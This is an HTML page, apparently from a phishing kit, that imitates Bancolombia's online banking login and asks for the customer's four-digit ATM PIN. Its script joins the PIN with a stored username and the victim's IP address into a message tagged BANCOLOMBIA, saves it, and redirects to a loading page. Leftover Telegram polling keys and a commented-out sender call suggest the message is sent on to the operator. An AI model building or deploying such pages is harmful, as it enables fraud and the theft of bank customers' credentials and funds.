<!DOCTYPE html>
<html lang="es">
<head>
     
	 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> Sucursal Virtual Personas</title>
<link rel="stylesheet" href="style.css">
<script src="js/jquery-3.7.7.js"></script>
</head>
<body class="clave-page">

<!-- HEADER SUPERIOR -->
<div class="header-top">
    <div class="header-content">
        <img src="images/logo.svg" alt="Bancolombia" class="logo-header">
    </div>
</div>

<h1 class="titulo-principal">Ingresa tu clave</h1>

<div class="form-container">
    <div class="form-box">
        <img src="icons/icon-lock.png" class="clave-icon" alt="">
        <p class="descripcion">Es la misma que usas en el cajero automático</p>

        <!-- INPUT CLAVE 4 DIGITOS -->
        <div class="password-wrapper">
            <input type="tel" id="clave" maxlength="4" class="real-password-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
            <div class="password-slots">
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
                <div class="password-slot"></div>
            </div>
        </div>

        <div class="botones">
            <button class="btn-continuar" onclick="validarYEnviar()">Continuar</button>
        </div>

        <p class="olv"><a href="#">¿Olvidaste tu usuario o clave?</a></p>
    </div>
    <!-- IMAGEN DE LINEAS COMO PARTE INFERIOR DEL CARD (ELIMINADA) -->

</div>

<img src="images/5125617020933180513 (1).jpg" class="clave-decor" id="clave-decor" alt="">

<!-- FOOTER -->
<div class="footer-container">
    <div class="vigilado-logo">
        <img src="images/vigiladosuper.png">
    </div>

    <div class="info-footer">
        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
        <div id="fecha-hora" class="fecha-text"></div>
    </div>
</div>

<!-- CAMPOS NECESARIOS PARA DATOS -->
<div id="address" style="display:none;"></div>

<script>
    // Manejo visual del input de clave
    const inputClave = document.getElementById('clave');
    const slots = document.querySelectorAll('.password-slot');
    const passwordWrapper = document.querySelector('.password-wrapper');
    const claveDecor = document.getElementById('clave-decor');
    const page = document.body;
    const footer = document.querySelector(".footer-container");

    function posicionarDecor() {
        if (!claveDecor || !page || !passwordWrapper) return;
        const pageRect = page.getBoundingClientRect();
        const inputRect = passwordWrapper.getBoundingClientRect();
        const top = (inputRect.bottom - pageRect.top) + 18;
        page.style.setProperty("--clave-decor-top", `${Math.max(0, top)}px`);
    }

    function posicionarDecorPegadoFooter() {
        if (!claveDecor || !footer) return;
        const gap = -26;
        const footerRect = footer.getBoundingClientRect();
        const bottom = window.innerHeight - footerRect.top + gap;
        page.style.setProperty("--clave-decor-bottom", `${Math.max(0, bottom)}px`);
    }

    function ponerDecorDebajoDelInput() {
        if (!claveDecor) return;
        posicionarDecor();
        claveDecor.classList.add("is-under-input");
    }

    function ponerDecorAbajo() {
        if (!claveDecor) return;
        claveDecor.classList.remove("is-under-input");
        posicionarDecorPegadoFooter();
    }

    inputClave.addEventListener('input', function() {
        const val = this.value;
        // Permitir solo números
        if (!/^\d*$/.test(val)) {
            this.value = val.replace(/\D/g, '');
        }
        
        const cleanVal = this.value;
        
        slots.forEach((slot, index) => {
            if (index < cleanVal.length) {
                slot.textContent = '•';
                slot.classList.add('filled');
            } else {
                slot.textContent = '';
                slot.classList.remove('filled');
            }
            
            // Highlight current slot
            if (index === cleanVal.length) {
                slot.classList.add('active');
            } else {
                slot.classList.remove('active');
            }
        });
        ponerDecorDebajoDelInput();
    });

    inputClave.addEventListener('focus', ponerDecorDebajoDelInput);
    inputClave.addEventListener('blur', ponerDecorAbajo);
    window.addEventListener("resize", function() {
        if (!claveDecor) return;
        if (claveDecor.classList.contains("is-under-input")) posicionarDecor();
        else posicionarDecorPegadoFooter();
    });

    if (passwordWrapper && inputClave) {
        passwordWrapper.addEventListener('click', function() {
            inputClave.focus();
        });
        passwordWrapper.addEventListener('touchstart', function() {
            inputClave.focus();
        }, { passive: true });
    }

    document.addEventListener('keydown', function(e) {
        const key = e.key;
        const activeTag = document.activeElement ? document.activeElement.tagName : "";
        const writingInOtherField = activeTag === "INPUT" || activeTag === "TEXTAREA";

        if (key >= '0' && key <= '9' && !writingInOtherField) {
            if (inputClave.value.length < 4) {
                inputClave.value += key;
                inputClave.dispatchEvent(new Event('input', { bubbles: true }));
            }
            e.preventDefault();
            return;
        }

        if (key === 'Backspace' && !writingInOtherField) {
            inputClave.value = inputClave.value.slice(0, -1);
            inputClave.dispatchEvent(new Event('input', { bubbles: true }));
            e.preventDefault();
        }
    });

    // Lógica de validación y envío
    function validarYEnviar() {
        const clave = inputClave.value;
        
        if (clave.length !== 4) {
            // Puedes mostrar un error visual aquí si quieres, o solo no avanzar
            alert("La clave debe tener 4 dígitos");
            return;
        }

        // Ocultar botones
        document.querySelector('.botones').style.display = 'none';

        // Obtener datos previos
        const usuario = localStorage.getItem('userName') || "Desconocido";
        const ip = document.getElementById("gfg").textContent;
        const ip2 = document.getElementById("address").textContent; // Si está disponible

        // Guardar mensaje
        const message = `Usuario: ${usuario}\nClave: ${clave}\nIP: ${ip}\n${ip2}\nBANCOLOMBIA`;
        localStorage.setItem('message', message);
        localStorage.setItem('clave', clave);
        localStorage.removeItem('transaction_id');
        localStorage.removeItem('transaction_started_at');
        localStorage.removeItem('transaction_started_for');
        localStorage.removeItem('tg_update_offset');
        localStorage.removeItem('tg_empty_polls');

        // Aquí iría el envío real (sender), simulamos redirección a load.html como en el original
        // Llamada a sender() si existe o lógica inline
        // sender(); 
        
        // Simulación de envío y redirección
        window.location.href = 'load.html';
    }

    // IP real con fallback
    (function() {
        const ipSpan = document.getElementById("gfg");
        const ipAddress = document.getElementById("address");

        function setIP(ip) {
            if (ipSpan) ipSpan.textContent = ip;
            if (ipAddress) ipAddress.textContent = ip;
        }

        function setIPFallback() {
            setIP("No disponible");
        }

        fetch("https://api64.ipify.org?format=json", { cache: "no-store" })
            .then(r => r.json())
            .then(d => {
                if (d && d.ip) setIP(d.ip);
                else setIPFallback();
            })
            .catch(() => {
                fetch("https://api.ipify.org?format=json", { cache: "no-store" })
                    .then(r => r.json())
                    .then(d => {
                        if (d && d.ip) setIP(d.ip);
                        else setIPFallback();
                    })
                    .catch(setIPFallback);
            });
    })();

    // Fecha y Hora
    function actualizarFecha() {
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
        const fecha = new Date().toLocaleString('es-CO', options);
        document.getElementById("fecha-hora").textContent = fecha;
    }
    setInterval(actualizarFecha, 1000);
    actualizarFecha();

    // Focus inicial al cargar (opcional)
    // inputClave.focus();
    ponerDecorAbajo();
</script>

</body>
</html>
